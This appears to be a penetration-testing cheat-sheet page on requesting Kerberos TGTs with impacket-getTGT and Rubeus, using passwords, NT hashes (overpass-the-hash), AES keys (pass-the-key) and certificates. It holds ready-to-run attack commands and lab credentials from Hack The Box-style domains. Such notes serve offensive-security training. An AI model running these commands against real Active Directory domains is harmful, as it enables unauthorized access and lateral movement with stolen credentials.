# Get the ticket

The Kerberos authentication protocol works with tickets in order to grant access. A Service Ticket (ST) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can be obtained by validating a first step named "pre-authentication" .&#x20;

Attacker requires a user password, NT hash, or secret key (DES, RC4, AES128 or AES256) derived from the user password to get a valid TGT.&#x20;

Linux

{% code overflow="wrap" %}
```bash
# with an password 
impacket-getTGT rebound.htb/ldap_monitor:'1GR8t@$$4u' -dc-ip $RHOST
impacket-getTGT rebound.htb/tbrady:543BOMBOMBUNmanda  -dc-ip $RHOST
impacket-getTGT 'absolute.htb/d.klay:Darkmoonsky248girl' -dc-ip $RHOST

# with an NT hash (overpass-the-hash)
getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET
impacket-getTGT rebound.htb/delegator$ -hashes aad3b435b51404eeaad3b435b51404ee:9b0ccb7d34c670b2a9c81c45bc8befc3  -dc-ip $RHOST

# with an AES (128 or 256 bits) key (pass-the-key)
getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET
```
{% endcode %}

Windows

```bash
# with a password
rubeus.exe asktgt /user:harshitrajpal /password:Password@1 /ptt
# ptt: inject the ticket into current command line

# with an NT hash
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt

# with an AES 128 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$NThash /ptt

# with an AES 256 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$NThash /ptt

# Certificate
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
```

